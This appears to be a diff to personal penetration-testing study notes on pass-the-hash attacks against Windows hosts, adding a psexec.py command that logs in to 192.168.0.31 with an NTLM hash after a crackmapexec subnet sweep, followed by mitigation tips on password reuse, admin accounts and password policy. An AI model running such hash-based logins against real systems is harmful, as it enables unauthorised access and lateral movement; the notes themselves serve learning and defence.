@@ -47,3 +47,15 @@ crackmapexec 192.168.0.0/24 -u "Frank Castle" -H secondhash
 
 https://ptestmethod.readthedocs.io/en/latest/cme.html
 
+psexec.py "fcastle":@192.168.0.31 -hashes aad3b435b51404eeaad3b435b51404ee:9f76e41124d234a7d001a240b71814b5
+
+Mitigation: avoid reuse local admin password
+disable guest and administrator accounts
+limits administrators
+
+strong password > 14
+no common words
+long sentences
+
+privilege access management
+rotate passwords
